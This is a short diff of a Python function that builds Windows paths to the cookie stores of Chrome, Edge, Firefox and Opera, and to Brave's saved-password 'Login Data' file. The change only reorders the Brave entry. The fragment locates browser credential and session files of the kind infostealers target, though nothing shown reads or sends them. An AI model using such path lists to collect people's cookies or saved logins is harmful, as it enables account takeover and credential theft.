@@ -16,9 +16,9 @@ def get_browser_cookies_path():
     paths = {
         "chrome": os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies"),
         "edge": os.path.join(user_path, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies"),
+        "brave": os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
         "firefox": os.path.join(user_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
         "opera": os.path.join(user_path, "AppData", "Roaming", "Opera Software", "Opera Stable", "Cookies"),
-        "brave": os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
     }
 
     detected_paths = {browser: path for browser, path in paths.items() if os.path.exists(path)}
